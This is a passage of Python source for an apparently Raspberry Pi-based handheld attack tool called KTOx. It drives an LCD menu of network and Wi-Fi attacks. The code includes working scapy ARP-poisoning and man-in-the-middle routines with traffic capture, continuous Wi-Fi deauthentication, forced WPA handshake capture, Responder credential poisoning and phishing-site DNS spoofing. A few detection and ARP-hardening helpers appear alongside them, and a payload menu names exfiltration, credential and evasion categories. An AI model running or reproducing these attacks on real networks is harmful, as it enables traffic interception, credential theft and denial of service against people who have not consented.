    THEME_HOLD_SEC  = 5.0

    try:
        while True:
            # ── Draw current theme ────────────────────────────────────────────
            if HAS_HW and LCD and image:
                _ts = time.time()
                with draw_lock:
                    try:
                        _draw_stealth_theme(_ts)
                        LCD.LCD_ShowImage(image, 0, 0)
                    except Exception as _e:
                        print(f"[STEALTH] {_e!r}", flush=True)

            # ── WebUI toggle ──────────────────────────────────────────────────
            try:
                if os.path.isfile(STEALTH_CMD):
                    data = json.loads(Path(STEALTH_CMD).read_text())
                    os.remove(STEALTH_CMD)
                    if not data.get("stealth", True):
                        break
            except Exception:
                pass

            # ── KEY2 held 5 s → cycle theme ───────────────────────────────────
            if HAS_HW:
                try:
                    k2 = GPIO.input(PINS["KEY2_PIN"]) == 0
                    if k2:
                        if key2_held_since is None:
                            key2_held_since = time.time()
                        elif time.time() - key2_held_since >= THEME_HOLD_SEC:
                            _stealth_theme_idx = (
                                _stealth_theme_idx + 1) % len(_STEALTH_THEMES)
                            key2_held_since = None   # require re-hold for next
                            # Brief flash to confirm theme change
                            with draw_lock:
                                draw.rectangle([0, 0, 127, 127], fill=(0, 0, 0))
                                LCD.LCD_ShowImage(image, 0, 0)
                            time.sleep(0.3)
                    else:
                        key2_held_since = None
                except Exception:
                    pass

            # ── KEY1 + KEY3 held 3 s → exit ───────────────────────────────────
            if HAS_HW:
                try:
                    k1 = GPIO.input(PINS["KEY1_PIN"]) == 0
                    k3 = GPIO.input(PINS["KEY3_PIN"]) == 0
                    if k1 and k3:
                        if held_since is None:
                            held_since = time.time()
                        elif time.time() - held_since >= 3.0:
                            break
                    else:
                        held_since = None
                except Exception:
                    pass

            time.sleep(0.2)
    finally:
        ktox_state["stealth"] = False
        screen_lock.clear()
        try:
            open(STATE_FILE, "w").write("0")
        except Exception:
            pass
        Dialog_info("Stealth off", wait=False, timeout=1.5)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Attack helpers ─────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _run_attack(title, cmd, shell=False):
    """Live-streaming attack runner with KEY3=stop."""
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    logpath = f"{LOOT_DIR}/atk_{title.lower().replace(' ','_')}_{ts}.log"
    os.makedirs(LOOT_DIR, exist_ok=True)
    logfh   = open(logpath, "w")

    proc = subprocess.Popen(
        cmd, shell=shell,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    ktox_state["running"] = title
    lines   = [f"Starting {title}…"]
    elapsed = 0

    def _reader():
        for line in proc.stdout:
            line = line.strip()
            if line:
                logfh.write(f"[{time.strftime('%H:%M:%S')}] {line}\n")
                logfh.flush()
                lines.append(line[:22])
                if len(lines) > 5: lines.pop(0)
    threading.Thread(target=_reader, daemon=True).start()

    try:
        while proc.poll() is None:
            with draw_lock:
                _draw_toolbar()
                color.DrawMenuBackground()
                color.DrawBorder()
                draw.rectangle([3,14,124,26], fill=color.select)
                _centered(title[:18], 15, fill=color.selected_text)
                pulse = "●" if elapsed % 2 == 0 else "○"
                draw.text((115,15), pulse, font=text_font, fill=color.border)
                y = 30
                for line in lines[-5:]:
                    c = "#1E8449" if line.startswith("✔") else \
                        "#C0392B" if line.startswith("✖") else \
                        "#D4AC0D" if line.startswith("!") else color.text
                    draw.text((5,y), line[:20], font=text_font, fill=c)
                    y += 12
                draw.text((5,108), f"Elapsed: {elapsed}s",
                          font=small_font, fill="#606060")
                draw.rectangle([3,116,124,124], fill="#222222")
                _centered("KEY3=stop", 117, font=small_font,
                          fill=color.text)
            btn = getButton(timeout=1)
            if btn == "KEY3_PIN": break
            elapsed += 1
    except KeyboardInterrupt:
        pass
    finally:
        if proc.poll() is None:
            proc.terminate()
            try: proc.wait(timeout=3)
            except: proc.kill()
        logfh.close()
        ktox_state["running"] = None
    return elapsed


def _pick_host():
    hosts = ktox_state["hosts"]
    if not hosts:
        Dialog_info("No hosts.\nRun scan first.", wait=True)
        return None

    items = []
    for h in hosts:
        ip = h.get("ip", "?") if isinstance(h, dict) else (h[0] if len(h) > 0 else "?")
        items.append(ip.strip())

    WINDOW = 6
    total  = len(items)
    sel    = 0

    while True:
        offset = max(0, min(sel-2, total-WINDOW))
        window = items[offset:offset+WINDOW]

        with draw_lock:
            _draw_toolbar()
            draw.rectangle([0,12,128,128], fill=color.background)
            color.DrawBorder()
            draw.rectangle([3,13,125,24], fill="#1a0000")
            _centered("Pick Target", 13, font=small_font, fill=color.border)
            draw.line([3,24,125,24], fill=color.border, width=1)
            for i, ip in enumerate(window):
                row_y  = 26 + 13*i
                is_sel = (i == sel-offset)
                if is_sel:
                    draw.rectangle([3, row_y, 124, row_y+12], fill=color.select)
                draw.text((5, row_y+1), ip[:22], font=text_font,
                          fill=color.selected_text if is_sel else color.text)
            draw.line([3,112,125,112], fill="#2a0505", width=1)
            _centered("CTR=select  LEFT=back", 114, font=small_font, fill="#4a2020")

        time.sleep(0.08)
        btn = getButton(timeout=0.5)
        if   btn is None:                               continue
        elif btn == "KEY_DOWN_PIN":                     sel = (sel+1) % total
        elif btn == "KEY_UP_PIN":                       sel = (sel-1) % total
        elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):  return items[sel].strip()
        elif btn in ("KEY_LEFT_PIN","KEY1_PIN",
                     "KEY2_PIN","KEY3_PIN"):            return None

# ═══════════════════════════════════════════════════════════════════════════════
# ── KTOx attack modules ────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def do_network_scan():
    Dialog_info("Scanning network…", wait=False, timeout=1)
    gw = ktox_state["gateway"]
    if not gw:
        Dialog_info("No gateway!\nCheck connection.", wait=True)
        return
    net = gw.rsplit(".",1)[0]+".0/24"
    rc, out = _run(["nmap","-sn","-T4","--oG","-",net], timeout=90)
    import re
    hosts = []
    for mo in re.finditer(r"Host: (\d+\.\d+\.\d+\.\d+)\s+\(([^)]*)\)", out):
        hosts.append({"ip":mo.group(1),"hostname":mo.group(2),"mac":"","vendor":""})
    ktox_state["hosts"] = hosts
    lines = [f"✔ {len(hosts)} host(s) found", f"  Net: {net}"]
    for h in hosts[:4]: lines.append(f"  {h['ip']}")
    if len(hosts)>4: lines.append(f"  +{len(hosts)-4} more")
    GetMenuString(lines)


# ── ARP helpers ────────────────────────────────────────────────────────────────

def _ask_pps():
    """Select packets per second using a spinner (no list scrolling)."""
    rates = [5, 10, 25, 50, 100, 250, 500, 1000]
    idx = 4  # start at 100 pkt/s
    while True:
        with draw_lock:
            _draw_toolbar()
            draw.rectangle([0, 12, 128, 128], fill=color.background)
            color.DrawBorder()
            draw.rectangle([3, 13, 125, 24], fill="#1a0000")
            _centered("PACKETS/SEC", 13, font=small_font, fill=color.border)
            draw.line([3, 24, 125, 24], fill=color.border, width=1)
            _centered(str(rates[idx]), 48, font=text_font, fill=color.selected_text)
            draw.text((4, 80), "UP/DOWN  change", font=small_font, fill=color.text)
            draw.text((4, 95), "OK  select",      font=small_font, fill=color.text)
            draw.text((4, 110), "K3  cancel",     font=small_font, fill=color.text)
        btn = getButton(timeout=0.5)
        if btn == "KEY_UP_PIN":
            idx = (idx + 1) % len(rates)
        elif btn == "KEY_DOWN_PIN":
            idx = (idx - 1) % len(rates)
        elif btn in ("KEY_PRESS_PIN", "KEY_RIGHT_PIN"):
            return rates[idx]
        elif btn in ("KEY_LEFT_PIN", "KEY1_PIN", "KEY3_PIN"):
            return None
        # else continue


def _get_interface_for_ip(ip):
    """Return the network interface used to reach the given IP."""
    try:
        rc, out = _run(["ip", "route", "get", ip], timeout=2)
        import re
        m = re.search(r"dev\s+(\S+)", out)
        if m:
            return m.group(1)
    except:
        pass
    return ktox_state["iface"]  # fallback


def _get_mac_arping(ip, iface, timeout=2):
    """Use system arping to get MAC address."""
    try:
        cmd = ["arping", "-c", "1", "-I", iface, "-w", str(timeout), ip]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+1)
        import re
        m = re.search(r"\[([0-9a-fA-F:]{17})\]", proc.stdout)
        if m:
            return m.group(1).upper()
    except Exception:
        pass
    return ""

def _scapy_resolve(ip, iface):
    """
    Return MAC for ip, or empty string on failure.
    Tries: ARP cache, arping, then scapy.
    """
    # 1. Check local ARP cache
    rc, out = _run(["arp", "-n", ip], timeout=3)
    if rc == 0:
        import re
        m = re.search(r"([0-9a-fA-F:]{17})", out)
        if m:
            mac = m.group(1).upper()
            if mac != "FF:FF:FF:FF:FF:FF":
                return mac
    # 2. Try system arping
    mac = _get_mac_arping(ip, iface)
    if mac:
        return mac
    # 3. Fallback to scapy
    script = (
        "import sys,logging;"
        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
        "from scapy.all import srp,Ether,ARP;"
        f"ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='{ip}'),"
        f"iface='{iface}',timeout=2,verbose=0,retry=2);"
        "print(ans[0][1][Ether].src if ans else '')"
    )
    try:
        r = subprocess.run(["python3", "-c", script],
                           capture_output=True, text=True, timeout=8)
        mac = r.stdout.strip()
        if mac:
            return mac.upper()
    except Exception:
        pass
    return ""


def _scapy_restore(target_ip, target_mac, gw_ip, gw_mac, iface, my_mac):
    """Send 10 correct ARP replies to restore both sides."""
    script = (
        "import sys,time,logging;"
        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
        "from scapy.all import Ether,ARP,sendp;"
        f"iface='{iface}';"
        f"t_ip='{target_ip}';t_mac='{target_mac}';"
        f"g_ip='{gw_ip}';g_mac='{gw_mac}';"
        "[\n"
        "  sendp(Ether(src=g_mac,dst=t_mac)/ARP(op=2,hwsrc=g_mac,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface)\n"
        "  or sendp(Ether(src=t_mac,dst=g_mac)/ARP(op=2,hwsrc=t_mac,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface)\n"
        "  for _ in range(10)\n"
        "]"
    )
    try:
        subprocess.run(["python3", "-c", script],
                       capture_output=True, timeout=10)
    except Exception:
        pass


def do_arp_kick(target_ip, pps=10):
    """Bidirectional ARP poison (target + gateway) at configurable PPS."""
    # Find correct interface for the target
    iface = _get_interface_for_ip(target_ip)
    gw    = ktox_state["gateway"]
    if not gw:
        Dialog_info("No gateway!\nRun scan first.", wait=True)
        return

    Dialog_info(f"Resolving MACs…\n{target_ip} via {iface}", wait=False, timeout=1)
    target_mac = _scapy_resolve(target_ip, iface)
    gw_mac     = _scapy_resolve(gw, iface)
    if not target_mac:
        Dialog_info(f"MAC resolve\nfailed for\n{target_ip}", wait=True)
        return

    interval = 1.0 / max(1, pps)
    script = (
        "import sys,time,logging,signal;"
        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
        "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
        "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
        f"iface='{iface}';"
        f"my=get_if_hwaddr(iface);"
        f"t_ip='{target_ip}';t_mac='{target_mac}';"
        f"g_ip='{gw}';g_mac='{gw_mac}';"
        f"iv={interval!r};"
        "while True:"
        "  # Poison target: gateway IP is at my MAC"
        "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
        "  # Poison gateway: target IP is at my MAC"
        "  if g_mac:"
        "    sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
        "  time.sleep(iv)"
    )
    proc = subprocess.Popen(["python3", "-c", script],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = f"ARP KICK {pps}/s"
    Dialog_info(f"ARP KICK\n{target_ip}\n{pps} pkt/s bidir\nvia {iface}\nKEY3=stop", wait=True)
    proc.terminate()
    try:
        proc.wait(timeout=2)
    except Exception:
        proc.kill()
    ktox_state["running"] = None
    if target_mac and gw_mac:
        _scapy_restore(target_ip, target_mac, gw, gw_mac, iface, "")
    Dialog_info("Kick stopped.\nARP restored.", wait=False, timeout=1)


def do_mitm(target_ip):
    """Bidirectional ARP MITM using Scapy. Enables IP forwarding."""
    iface = _get_interface_for_ip(target_ip)
    gw    = ktox_state["gateway"]
    if not gw:
        Dialog_info("No gateway!\nRun scan first.", wait=True)
        return

    Dialog_info(f"Resolving MACs…\n{target_ip} via {iface}", wait=False, timeout=1)
    target_mac = _scapy_resolve(target_ip, iface)
    gw_mac     = _scapy_resolve(gw, iface)
    if not target_mac or not gw_mac:
        Dialog_info("MAC resolve\nfailed.", wait=True)
        return

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    script = (
        "import sys,time,logging,signal;"
        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
        "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
        "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
        f"iface='{iface}';"
        f"my=get_if_hwaddr(iface);"
        f"t_ip='{target_ip}';t_mac='{target_mac}';"
        f"g_ip='{gw}';g_mac='{gw_mac}';"
        "while True:"
        "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
        "  sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
        "  time.sleep(0.5)"
    )
    proc = subprocess.Popen(["python3", "-c", script],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = "MITM"
    Dialog_info(f"MITM ACTIVE\n{target_ip}\nFwd ON\nKEY3=stop", wait=True)
    proc.terminate()
    try:
        proc.wait(timeout=2)
    except Exception:
        proc.kill()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    ktox_state["running"] = None
    _scapy_restore(target_ip, target_mac, gw, gw_mac, iface, "")
    Dialog_info("MITM stopped.\nFwd OFF.\nARP restored.", wait=False, timeout=2)


def do_wifi_monitor_on():
    import re as _re
    iface = ktox_state["wifi_iface"]
    Dialog_info(f"Enabling mon\n{iface}…", wait=False, timeout=1)

    # Kill interfering processes then try airmon-ng
    _run(["airmon-ng", "check", "kill"], timeout=10)
    _run(["ip", "link", "set", iface, "up"], timeout=5)
    rc, out = _run(["airmon-ng", "start", iface], timeout=20)

    # Detect newly created monitor interface
    mon = None
    mo = _re.search(r"((?:wlan|mon)\w*mon\w*|mon\d+)", out)
    if mo:
        mon = mo.group(1)
    if not mon:
        _, out2 = _run(["iw", "dev"])
        for candidate in _re.findall(r"Interface\s+(\w+)", out2):
            if "mon" in candidate:
                mon = candidate
                break

    if mon:
        ktox_state["mon_iface"] = mon
        Dialog_info(f"Monitor on:\n{mon}", wait=True)
        return

    # airmon-ng failed — try iw fallback
    Dialog_info("Trying iw\nfallback…", wait=False, timeout=1)
    _run(["systemctl", "stop", "NetworkManager"], timeout=5)
    _run(["ip", "link", "set", iface, "down"], timeout=5)
    _run(["iw", "dev", iface, "set", "type", "monitor"], timeout=5)
    _run(["ip", "link", "set", iface, "up"], timeout=5)
    _, out3 = _run(["iw", "dev", iface, "info"])
    if "monitor" in out3.lower():
        ktox_state["mon_iface"] = iface
        Dialog_info(f"Monitor on:\n{iface} (iw)", wait=True)
    else:
        Dialog_info("Monitor FAILED\nCheck adapter.", wait=True)


def do_wifi_monitor_off():
    mon = ktox_state.get("mon_iface")
    iface = ktox_state["wifi_iface"]
    if not mon:
        Dialog_info("Not in monitor\nmode.", wait=True)
        return

    # Try airmon-ng first, then iw fallback
    rc, _ = _run(["airmon-ng", "stop", mon], timeout=10)
    if rc != 0 or mon == iface:
        # iw fallback: restore managed mode
        _run(["ip", "link", "set", mon, "down"], timeout=5)
        _run(["iw", "dev", mon, "set", "type", "managed"], timeout=5)
        _run(["ip", "link", "set", mon, "up"], timeout=5)

    _run(["systemctl", "start", "NetworkManager"], timeout=8)
    ktox_state["mon_iface"] = None
    Dialog_info("Monitor off.\nNM restarted.", wait=True)


def do_wifi_scan():
    mon = ktox_state.get("mon_iface")
    if not mon:
        Dialog_info("Enable monitor\nmode first.", wait=True)
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outpath = f"{LOOT_DIR}/wifi_scan_{ts}"
    _run_attack("WiFi SCAN",
        ["airodump-ng","--write",outpath,"--output-format","csv",
         "--write-interval","3",mon])


def do_arp_watch():
    _run_attack("ARP WATCH", [
        "python3", "-c",
        "import subprocess, time\n"
        "print('ARP Watch — KEY3=stop')\n"
        "def snap():\n"
        "    out = subprocess.check_output(['arp','-an'],text=True,timeout=5)\n"
        "    t = {}\n"
        "    for ln in out.splitlines():\n"
        "        p = ln.split()\n"
        "        try:\n"
        "            ip=p[1].strip('()'); mac=p[3]\n"
        "            if mac!='<incomplete>': t[ip]=mac\n"
        "        except: pass\n"
        "    return t\n"
        "base=snap(); print(f'Baseline: {len(base)} entries')\n"
        "while True:\n"
        "    time.sleep(8); cur=snap()\n"
        "    for ip,mac in cur.items():\n"
        "        if ip in base and base[ip]!=mac:\n"
        "            print(f'! POISON {ip} {base[ip][:11]}->{mac[:11]}')\n"
        "        elif ip not in base:\n"
        "            print(f'+ NEW {ip} {mac}')\n"
        "    base=cur\n"
    ])

def do_arp_diff():
    _run_attack("ARP DIFF",[
        "python3","-c",
        "import subprocess,time\n"
        "def arp():\n"
        "  out=subprocess.check_output(['arp','-an'],text=True)\n"
        "  t={}\n"
        "  for line in out.splitlines():\n"
        "    p=line.split()\n"
        "    try:\n"
        "      ip=p[1].strip('()');mac=p[3]\n"
        "      if mac!='<incomplete>':t[ip]=mac\n"
        "    except:pass\n"
        "  return t\n"
        "base=arp()\n"
        "print(f'Baseline: {len(base)} entries')\n"
        "while True:\n"
        "  time.sleep(5);cur=arp()\n"
        "  for ip,mac in cur.items():\n"
        "    if ip in base and base[ip]!=mac:\n"
        "      print(f'! CHANGE {ip} {base[ip][:11]} -> {mac[:11]}');base[ip]=mac\n"
        "    elif ip not in base:\n"
        "      print(f'+ NEW {ip} {mac}');base[ip]=mac"
    ])


def do_rogue_detect():
    gw  = ktox_state["gateway"]
    net = gw.rsplit(".",1)[0]+".0/24" if gw else "192.168.1.0/24"
    _run_attack("ROGUE DETECT",[
        "python3","-c",
        f"""
import sys,time; sys.path.insert(0,'{KTOX_DIR}')
import scan
hosts=scan.scanNetwork('{net}')
known={{h[1]:h[0] for h in hosts if len(h)>1 and h[1]}}
print(f'Baseline: {{len(known)}} MACs')
while True:
    time.sleep(30)
    cur=scan.scanNetwork('{net}')
    for h in cur:
        mac=h[1] if len(h)>1 else ''; ip=h[0]
        if mac and mac not in known:
            print(f'! ROGUE {{ip}} {{mac}}'); known[mac]=ip
"""
    ])


def do_llmnr_detect():
    _run_attack("LLMNR DETECT",[
        "python3","-c",
        "from scapy.all import sniff,UDP,DNS,IP\n"
        "def h(p):\n"
        "  if UDP in p and p[UDP].dport==5355:\n"
        "    if DNS in p:\n"
        "      src=p[IP].src if IP in p else '?'\n"
        "      if p[DNS].qr==1: print(f'! RESPONSE {src} possible poison')\n"
        "      else:\n"
        "        qn=p[DNS].qd.qname.decode(errors='ignore') if p[DNS].qd else '?'\n"
        "        print(f'~ QUERY {src} {qn}')\n"
        "sniff(filter='udp and port 5355',prn=h,store=0)"
    ])


def do_responder_on():
    iface = ktox_state["iface"]
    rpy   = f"{INSTALL_PATH}Responder/Responder.py"
    if not os.path.exists(rpy):
        Dialog_info("Responder not\nfound.", wait=True)
        return
    subprocess.Popen(
        ["python3", rpy, "-Q", "-I", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    Dialog_info(f"Responder ON\nIF: {iface}", wait=True)


def do_responder_off():
    subprocess.run(
        "kill -9 $(ps aux | grep Responder | grep -v grep | awk '{print $2}')",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    Dialog_info("Responder OFF", wait=True)


def do_arp_harden():
    hosts = ktox_state["hosts"]
    if not hosts:
        Dialog_info("No hosts.\nRun scan first.", wait=True)
        return
    if not YNDialog("ARP HARDEN", y="Yes", n="No",
                    b=f"Apply {len(hosts)}\nstatic entries?"):
        return
    applied = 0
    for h in hosts:
        ip  = h.get("ip",h[0]) if isinstance(h,dict) else h[0]
        mac = h.get("mac",h[1]) if isinstance(h,dict) else h[1] if len(h)>1 else ""
        if ip and mac and mac not in ("","N/A"):
            rc, _ = _run(["arp","-s",ip,mac])
            if rc == 0: applied += 1
    Dialog_info(f"✔ {applied} entries\nlocked.\nPoison blocked.", wait=True)


def do_baseline_export():
    Dialog_info("Exporting…", wait=False, timeout=1)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"{LOOT_DIR}/baseline_{ts}.json"
    os.makedirs(LOOT_DIR, exist_ok=True)
    data = {
        "generated": ts,
        "interface": ktox_state["iface"],
        "gateway":   ktox_state["gateway"],
        "hosts": [
            h if isinstance(h,dict) else
            {"ip":h[0],"mac":h[1] if len(h)>1 else "",
             "vendor":h[2] if len(h)>2 else "",
             "hostname":h[3] if len(h)>3 else ""}
            for h in ktox_state["hosts"]
        ]
    }
    Path(path).write_text(json.dumps(data, indent=2))
    Dialog_info(f"✔ Saved:\nbaseline_{ts[:8]}\n{len(data['hosts'])} hosts", wait=True)


def do_dns_spoofing():
    sites = sorted([
        d for d in os.listdir(f"{INSTALL_PATH}DNSSpoof/sites")
        if os.path.isdir(f"{INSTALL_PATH}DNSSpoof/sites/{d}")
    ]) if os.path.exists(f"{INSTALL_PATH}DNSSpoof/sites") else []
    if not sites:
        Dialog_info("No phishing sites\nfound.", wait=True)
        return
    items = [f" {s}" for s in sites]
    sel   = GetMenuString(items)
    if not sel: return
    site  = sel.strip()
    if not YNDialog("DNS SPOOF", y="Yes", n="No", b=f"Spoof {site}?"):
        return
    webroot = f"{INSTALL_PATH}DNSSpoof/sites/{site}"
    subprocess.Popen(
        f"cd {webroot} && php -S 0.0.0.0:80",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    Dialog_info(f"DNS Spoof ON\n{site}", wait=True)


def do_dns_spoof_stop():
    subprocess.run("pkill -f 'php'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("pkill -f 'ettercap'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    Dialog_info("DNS Spoof\nstopped.", wait=True)

def do_start_mitm_suite():
    """Full on-device MITM: pick host, ARP poison both ways, tcpdump capture."""
    tgt = _pick_host()
    if not tgt:
        return
    iface = _get_interface_for_ip(tgt)
    gw    = ktox_state["gateway"]
    if not gw:
        Dialog_info("No gateway!\nRun scan first.", wait=True)
        return
    if not YNDialog("FULL MITM", y="Yes", n="No", b=f"{tgt}\nAll traffic?"):
        return
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    subprocess.run(["pkill", "-9", "arpspoof"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, gw],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, tgt],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap = f"{LOOT_DIR}/mitm_{ts}.pcap"
    os.makedirs(LOOT_DIR, exist_ok=True)
    subprocess.Popen(["tcpdump", "-i", iface, "-w", pcap, "-q"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = "MITM SUITE"
    Dialog_info(f"MITM ACTIVE\n{tgt}\nCapturing...\nKEY3=stop", wait=True)
    subprocess.run(["pkill", "-9", "arpspoof"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["pkill", "-9", "tcpdump"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    ktox_state["running"] = None
    Dialog_info(f"MITM stopped.\nPCAP: {os.path.basename(pcap)}", wait=True)


def do_deauth_targeted():
    """Scan APs, pick one, run continuous deauth until KEY3."""
    mon = ktox_state.get("mon_iface")
    if not mon:
        Dialog_info("Enable monitor\nmode first.", wait=True)
        return
    Dialog_info("Scanning APs\n10 seconds...", wait=False, timeout=1)
    import glob, csv
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    tmp = f"/tmp/ktox_scan_{ts}"
    os.makedirs(tmp, exist_ok=True)
    proc = subprocess.Popen(
        ["airodump-ng", "--write", f"{tmp}/s", "--output-format", "csv",
         "--write-interval", "5", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    proc.terminate()
    aps = []
    for cp in glob.glob(f"{tmp}/s*.csv"):
        try:
            for row in csv.reader(open(cp, errors="ignore")):
                if len(row) < 14: continue
                bssid=row[0].strip(); ch=row[3].strip(); essid=row[13].strip()
                if bssid and ":" in bssid and bssid!="BSSID" and ch.isdigit():
                    aps.append((bssid, ch, essid[:14] or "hidden"))
        except Exception: pass
    if not aps:
        Dialog_info("No APs found.\nTry again.", wait=True)
        return
    items = [f" {e}  ch{c}" for b,c,e in aps]
    sel   = GetMenuString(items)
    if not sel: return
    bssid, ch, essid = aps[items.index(sel)]
    if not YNDialog("DEAUTH", y="Yes", n="No", b=f"{essid}\nch{ch}?"):
        return
    subprocess.run(["pkill", "-9", "aireplay-ng"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    proc2 = subprocess.Popen(
        ["aireplay-ng", "--deauth", "0", "-a", bssid, mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = "DEAUTH"
    Dialog_info(f"DEAUTH active\n{essid}\nch{ch}\nKEY3=stop", wait=True)
    proc2.terminate()
    subprocess.run(["pkill", "-9", "aireplay-ng"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ktox_state["running"] = None
    Dialog_info("Deauth stopped.", wait=False, timeout=1)


def do_handshake_targeted():
    """Scan APs, pick one, capture WPA handshake via forced deauth."""
    mon = ktox_state.get("mon_iface")
    if not mon:
        Dialog_info("Enable monitor\nmode first.", wait=True)
        return
    Dialog_info("Scanning APs\n10 seconds...", wait=False, timeout=1)
    import glob, csv
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    tmp = f"/tmp/ktox_hs_{ts}"
    os.makedirs(tmp, exist_ok=True)
    proc = subprocess.Popen(
        ["airodump-ng", "--write", f"{tmp}/s", "--output-format", "csv",
         "--write-interval", "5", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    proc.terminate()
    aps = []
    for cp in glob.glob(f"{tmp}/s*.csv"):
        try:
            for row in csv.reader(open(cp, errors="ignore")):
                if len(row) < 14: continue
                bssid=row[0].strip(); ch=row[3].strip(); essid=row[13].strip()
                if bssid and ":" in bssid and bssid!="BSSID" and ch.isdigit():
                    aps.append((bssid, ch, essid[:14] or "hidden"))
        except Exception: pass
    if not aps:
        Dialog_info("No APs found.", wait=True)
        return
    items = [f" {e}  ch{c}" for b,c,e in aps]
    sel   = GetMenuString(items)
    if not sel: return
    bssid, ch, essid = aps[items.index(sel)]
    if not YNDialog("HANDSHAKE", y="Yes", n="No", b=f"{essid}\nch{ch}?"):
        return
    out_ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    outdir  = f"{LOOT_DIR}/handshakes"
    os.makedirs(outdir, exist_ok=True)
    outpath = f"{outdir}/hs_{essid.replace(' ','_')}_{out_ts}"
    cap = subprocess.Popen(
        ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", outpath, mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    subprocess.run(["aireplay-ng", "--deauth", "4", "-a", bssid, mon],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    Dialog_info(f"Capturing HS\n{essid}\nKEY3=stop\n~30 sec", wait=True)
    cap.terminate()
    subprocess.run(["pkill", "-9", "airodump-ng"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    Dialog_info(f"Saved:\nhs_{essid[:14]}\nUse aircrack-ng", wait=True)


# ═══════════════════════════════════════════════════════════════════════════════
# ── Payload directory scanner ──────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

PAYLOAD_CATEGORIES = [
    ("offensive",     "Offensive"),
    ("reconnaissance","Recon"),
    ("interception",  "Intercept"),
    ("dos",           "DoS"),
    ("wifi",          "WiFi"),
    ("bluetooth",     "Bluetooth"),
    ("network",       "Network"),
    ("credentials",   "Credentials"),
    ("evasion",       "Evasion"),
    ("hardware",      "Hardware"),
    ("usb",           "USB"),
    ("social_eng",    "Social Eng"),
    ("exfiltration",  "Exfiltrate"),
    ("remote_access", "Remote"),
    ("evil_portal",   "Evil Portal"),
    ("utilities",     "Utilities"),
    ("games",         "Games"),
    ("general",       "General"),
    ("examples",      "Examples"),
]


# ── FontAwesome 5 Solid icon map (Unicode Private-Use codepoints) ─────────────
# These map menu label text → FA glyph so every item gets an icon like RaspyJack.

_FA_ICONS: dict = {
    # ── Home menu ─────────────────────────────────────────────────────────
    "Network":          "\uf6ff",   # fa-network-wired
    "Offensive":        "\uf54c",   # fa-skull
    "WiFi Engine":      "\uf1eb",   # fa-wifi
    "MITM & Spoof":     "\uf0ec",   # fa-exchange
    "Responder":        "\uf382",   # fa-satellite-dish
